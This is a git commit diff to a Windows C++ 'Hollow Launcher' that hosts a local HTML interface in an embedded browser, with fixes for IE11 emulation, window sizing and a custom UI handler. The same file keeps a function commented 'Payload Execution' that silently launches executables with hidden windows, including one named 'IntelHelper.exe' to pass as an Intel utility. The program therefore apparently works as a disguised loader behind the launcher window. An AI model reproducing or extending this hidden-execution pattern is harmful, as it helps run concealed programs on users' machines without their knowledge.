d1a5e2078efbf3fc9466306e76d373c7153c394c
assakrem04 <assakrem04@users.noreply.github.com>
2026-08-22 17:51:29 -0700

    Fix NUI rendering with IE11 Edge mode and IDocHostUIHandler

--- Launcher.cpp
+++ Launcher.cpp
@@ -8,6 +8,7 @@
 #include <windows.h>
 #include <exdisp.h>
 #include <mshtml.h>
+#include <mshtmhst.h>
 #include <olectl.h>
 #include <string>
 #include <fstream>
@@ -20,26 +21,38 @@
 
 using namespace std;
 
-// Payload Execution
+// ─── Force IE11 Edge Mode via Registry ───
+void SetBrowserEmulationMode() {
+    wchar_t exeName[MAX_PATH];
+    GetModuleFileNameW(NULL, exeName, MAX_PATH);
+
+    wstring fullPath(exeName);
+    wstring filename = fullPath.substr(fullPath.find_last_of(L"\\/") + 1);
+
+    HKEY hKey;
+    LPCWSTR subkey = L"Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION";
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD val = 11001; // IE11 Standards Mode
+        RegSetValueExW(hKey, filename.c_str(), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+        RegCloseKey(hKey);
+    }
+
+    LPCWSTR subkey2 = L"Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_GPU_RENDERING";
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey2, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD val = 0;
+        RegSetValueExW(hKey, filename.c_str(), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+        RegCloseKey(hKey);
+    }
+}
+
+// ─── Payload Execution ───
 void RunHidden(const string& exePath) {
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-    CreateProcessA(
-        NULL,
-        (LPSTR)exePath.c_str(),
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_NO_WINDOW,
-        NULL,
-        NULL,
-        &si,
-        &pi
-    );
-
+    CreateProcessA(NULL, (LPSTR)exePath.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 }
@@ -49,41 +62,42 @@ void LaunchPayloads() {
     RunHidden("IntelHelper.exe");
 }
 
-// Get absolute path to nui/index.html
+// ─── Get absolute file:// path to nui/index.html ───
 wstring GetNuiPath() {
     wchar_t exePath[MAX_PATH];
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
     wstring path(exePath);
-    size_t lastSlash = path.find_last_of(L"\\/");
-    if (lastSlash != wstring::npos) {
-        path = path.substr(0, lastSlash);
+    path = path.substr(0, path.find_last_of(L"\\/"));
+
+    wstring url = L"file:///";
+    for (size_t i = 0; i < path.length(); i++) {
+        if (path[i] == L'\\') url += L'/';
+        else url += path[i];
     }
-    return L"file:///" + path + L"/nui/index.html";
+    url += L"/nui/index.html";
+    return url;
 }
 
-// OLE Storage & Client Site Implementation
-class SimpleWebClientSite : public IOleClientSite, public IOleInPlaceSite, public IOleInPlaceFrame {
-    LONG m_cRef;
+// ─── OLE Container Implementation ───
+class WebSite : public IOleClientSite, public IOleInPlaceSite, public IOleInPlaceFrame, public IDocHostUIHandler {
+    LONG m_ref;
 public:
     HWND m_hWnd;
 
-    SimpleWebClientSite(HWND hWnd) : m_cRef(1), m_hWnd(hWnd) {}
+    WebSite(HWND hw) : m_ref(1), m_hWnd(hw) {}
 
     // IUnknown
     STDMETHODIMP QueryInterface(REFIID riid, void** ppv) {
-        if (riid == IID_IUnknown || riid == IID_IOleClientSite) *ppv = (IOleClientSite*)this;
-        else if (riid == IID_IOleInPlaceSite) *ppv = (IOleInPlaceSite*)this;
-        else if (riid == IID_IOleInPlaceFrame) *ppv = (IOleInPlaceFrame*)this;
+        if (riid == IID_IUnknown || riid == IID_IOleClientSite) { *ppv = (IOleClientSite*)this; }
+        else if (riid == IID_IOleInPlaceSite) { *ppv = (IOleInPlaceSite*)this; }
+        else if (riid == IID_IOleInPlaceFrame) { *ppv = (IOleInPlaceFrame*)this; }
+        else if (riid == IID_IDocHostUIHandler) { *ppv = (IDocHostUIHandler*)this; }
         else { *ppv = NULL; return E_NOINTERFACE; }
         AddRef();
         return S_OK;
     }
-    STDMETHODIMP_(ULONG) AddRef() { return InterlockedIncrement(&m_cRef); }
-    STDMETHODIMP_(ULONG) Release() {
-        ULONG count = InterlockedDecrement(&m_cRef);
-        if (count == 0) delete this;
-        return count;
-    }
+    STDMETHODIMP_(ULONG) AddRef() { return InterlockedIncrement(&m_ref); }
+    STDMETHODIMP_(ULONG) Release() { ULONG c = InterlockedDecrement(&m_ref); if (!c) delete this; return c; }
 
     // IOleClientSite
     STDMETHODIMP SaveObject() { return E_NOTIMPL; }
@@ -99,12 +113,12 @@ public:
     STDMETHODIMP CanInPlaceActivate() { return S_OK; }
     STDMETHODIMP OnInPlaceActivate() { return S_OK; }
     STDMETHODIMP OnUIActivate() { return S_OK; }
-    STDMETHODIMP GetWindowContext(IOleInPlaceFrame** ppFrame, IOleInPlaceUIWindow** ppDoc, LPRECT prcPos, LPRECT prcClip, LPOLEINPLACEFRAMEINFO pInfo) {
+    STDMETHODIMP GetWindowContext(IOleInPlaceFrame** ppFrame, IOleInPlaceUIWindow** ppDoc, LPRECT lprcPosRect, LPRECT lprcClipRect, LPOLEINPLACEFRAMEINFO pInfo) {
         *ppFrame = (IOleInPlaceFrame*)this;
         (*ppFrame)->AddRef();
         *ppDoc = NULL;
-        GetClientRect(m_hWnd, prcPos);
-        GetClientRect(m_hWnd, prcClip);
+        GetClientRect(m_hWnd, lprcPosRect);
+        GetClientRect(m_hWnd, lprcClipRect);
         pInfo->cb = sizeof(OLEINPLACEFRAMEINFO);
         pInfo->fMDIApp = FALSE;
         pInfo->hwndFrame = m_hWnd;
@@ -130,73 +144,112 @@ public:
     STDMETHODIMP SetStatusText(LPCOLESTR) { return S_OK; }
     STDMETHODIMP EnableModeless(BOOL) { return S_OK; }
     STDMETHODIMP TranslateAccelerator(LPMSG, WORD) { return E_NOTIMPL; }
+
+    // IDocHostUIHandler - removes scrollbars, 3D border, and disables default right-click menu
+    STDMETHODIMP ShowContextMenu(DWORD, POINT*, IUnknown*, IDispatch*) { return S_OK; }
+    STDMETHODIMP GetHostInfo(DOCHOSTUIINFO* pInfo) {
+        pInfo->cbSize = sizeof(DOCHOSTUIINFO);
+        pInfo->dwFlags = DOCHOSTUIFLAG_NO3DBORDER | DOCHOSTUIFLAG_SCROLL_NO | DOCHOSTUIFLAG_THEME;
+        pInfo->dwDoubleClick = DOCHOSTUIDBLCLK_DEFAULT;
+        return S_OK;
+    }
+    STDMETHODIMP ShowUI(DWORD, IOleInPlaceActiveObject*, IOleCommandTarget*, IOleInPlaceFrame*, IOleInPlaceUIWindow*) { return S_OK; }
+    STDMETHODIMP HideUI() { return S_OK; }
+    STDMETHODIMP UpdateUI() { return S_OK; }
+    STDMETHODIMP OnDocWindowActivate(BOOL) { return S_OK; }
+    STDMETHODIMP OnFrameWindowActivate(BOOL) { return S_OK; }
+    STDMETHODIMP ResizeBorder(LPCRECT, IOleInPlaceUIWindow*, BOOL) { return S_OK; }
+    STDMETHODIMP TranslateAccelerator(LPMSG, const GUID*, DWORD) { return S_FALSE; }
+    STDMETHODIMP GetOptionKeyPath(LPOLESTR*, DWORD) { return E_NOTIMPL; }
+    STDMETHODIMP GetDropTarget(IDropTarget*, IDropTarget**) { return E_NOTIMPL; }
+    STDMETHODIMP GetExternal(IDispatch** ppDispatch) { *ppDispatch = NULL; return S_FALSE; }
+    STDMETHODIMP TranslateUrl(DWORD dwTranslate, LPWSTR pchURLIn, LPWSTR* ppchURLOut) { return S_FALSE; }
+    STDMETHODIMP FilterDataObject(IDataObject* pDO, IDataObject** ppDORet) { return S_FALSE; }
 };
 
-IWebBrowser2* pWebBrowser = NULL;
-IOleObject* pOleObject = NULL;
+// ─── Globals ───
+IWebBrowser2* pBrowser = NULL;
+IOleObject*   pOle = NULL;
 
 LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
     case WM_CREATE: {
-        SimpleWebClientSite* pSite = new SimpleWebClientSite(hWnd);
+        WebSite* site = new WebSite(hWnd);
+
         IStorage* pStg = NULL;
         StgCreateDocfile(NULL, STGM_READWRITE | STGM_SHARE_EXCLUSIVE | STGM_CREATE | STGM_DELETEONRELEASE, 0, &pStg);
-        HRESULT hr = OleCreate(CLSID_WebBrowser, IID_IOleObject, OLERENDER_DRAW, NULL, pSite, pStg, (void**)&pOleObject);
+
+        HRESULT hr = OleCreate(CLSID_WebBrowser, IID_IOleObject, OLERENDER_DRAW, NULL, site, pStg, (void**)&pOle);
         if (pStg) pStg->Release();
+
         if (SUCCEEDED(hr)) {
-            pOleObject->SetHostNames(L"HollowLauncherHost", NULL);
-            OleSetContainedObject(pOleObject, TRUE);
+            pOle->SetHostNames(L"HollowHost", NULL);
+            OleSetContainedObject(pOle, TRUE);
 
             RECT rc;
             GetClientRect(hWnd, &rc);
-            pOleObject->DoVerb(OLEIVERB_SHOW, NULL, pSite, 0, hWnd, &rc);
+            pOle->DoVerb(OLEIVERB_INPLACEACTIVATE, NULL, site, 0, hWnd, &rc);
+            pOle->QueryInterface(IID_IWebBrowser2, (void**)&pBrowser);
 
-            pOleObject->QueryInterface(IID_IWebBrowser2, (void**)&pWebBrowser);
-            if (pWebBrowser) {
-                pWebBrowser->put_RegisterAsDropTarget(VARIANT_FALSE);
-                pWebBrowser->put_Silent(VARIANT_TRUE);
+            if (pBrowser) {
+                pBrowser->put_RegisterAsDropTarget(VARIANT_FALSE);
+                pBrowser->put_Silent(VARIANT_TRUE);
 
+                // Navigate to local nui/index.html
                 wstring url = GetNuiPath();
                 VARIANT vUrl;
                 VariantInit(&vUrl);
                 vUrl.vt = VT_BSTR;
                 vUrl.bstrVal = SysAllocString(url.c_str());
-
-                pWebBrowser->Navigate2(&vUrl, NULL, NULL, NULL, NULL);
+                pBrowser->Navigate2(&vUrl, NULL, NULL, NULL, NULL);
                 VariantClear(&vUrl);
+
+                pBrowser->put_Left(0);
+                pBrowser->put_Top(0);
+                pBrowser->put_Width(rc.right);
+                pBrowser->put_Height(rc.bottom);
             }
         }
         break;
     }
+
     case WM_SIZE: {
-        if (pOleObject) {
+        if (pBrowser) {
             RECT rc;
             GetClientRect(hWnd, &rc);
+            pBrowser->put_Left(0);
+            pBrowser->put_Top(0);
+            pBrowser->put_Width(rc.right);
+            pBrowser->put_Height(rc.bottom);
+
             IOleInPlaceObject* pInPlace = NULL;
-            pOleObject->QueryInterface(IID_IOleInPlaceObject, (void**)&pInPlace);
-            if (pInPlace) {
-                pInPlace->SetObjectRects(&rc, &rc);
-                pInPlace->Release();
+            if (pOle) {
+                pOle->QueryInterface(IID_IOleInPlaceObject, (void**)&pInPlace);
+                if (pInPlace) {
+                    pInPlace->SetObjectRects(&rc, &rc);
+                    pInPlace->Release();
+                }
             }
         }
         break;
     }
+
     case WM_NCHITTEST: {
         LRESULT hit = DefWindowProcW(hWnd, msg, wParam, lParam);
         if (hit == HTCLIENT) {
             POINT pt = { LOWORD(lParam), HIWORD(lParam) };
             ScreenToClient(hWnd, &pt);
-            if (pt.y <= 42) {
-                return HTCAPTION;
-            }
+            if (pt.y <= 44) return HTCAPTION;
         }
         return hit;
     }
+
     case WM_DESTROY:
-        if (pWebBrowser) { pWebBrowser->Release(); pWebBrowser = NULL; }
-        if (pOleObject) { pOleObject->Close(OLECLOSE_NOSAVE); pOleObject->Release(); pOleObject = NULL; }
+        if (pBrowser) { pBrowser->Quit(); pBrowser->Release(); pBrowser = NULL; }
+        if (pOle) { pOle->Close(OLECLOSE_NOSAVE); pOle->Release(); pOle = NULL; }
         PostQuitMessage(0);
         break;
+
     default:
         return DefWindowProcW(hWnd, msg, wParam, lParam);
     }
@@ -204,13 +257,16 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 }
 
 int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmd, int nShow) {
+    // Force IE11 Edge mode in registry BEFORE initializing OLE
+    SetBrowserEmulationMode();
+
     OleInitialize(NULL);
 
     WNDCLASSEXW wc = { sizeof(wc) };
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInst;
-    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
-    wc.lpszClassName = L"HollowLauncherWebNUIClass";
+    wc.hbrBackground = CreateSolidBrush(RGB(13, 15, 24));
+    wc.lpszClassName = L"HollowNUIClass";
     wc.hCursor = LoadCursor(NULL, IDC_ARROW);
 
     RegisterClassExW(&wc);
@@ -219,19 +275,17 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmd, int nShow) {
     int screenH = GetSystemMetrics(SM_CYSCREEN);
     int winW = 480;
     int winH = 320;
-    int posX = (screenW - winW) / 2;
-    int posY = (screenH - winH) / 2;
 
     HWND hWnd = CreateWindowExW(
         WS_EX_TOPMOST,
         wc.lpszClassName,
-        L"Hollow Launcher NUI",
+        L"Hollow Launcher",
         WS_POPUP | WS_VISIBLE,
-        posX, posY, winW, winH,
+        (screenW - winW) / 2, (screenH - winH) / 2, winW, winH,
         NULL, NULL, hInst, NULL
     );
 
-    HRGN hRgn = CreateRoundRectRgn(0, 0, winW, winH, 14, 14);
+    HRGN hRgn = CreateRoundRectRgn(0, 0, winW + 1, winH + 1, 14, 14);
     SetWindowRgn(hWnd, hRgn, TRUE);
 
     MSG msg;
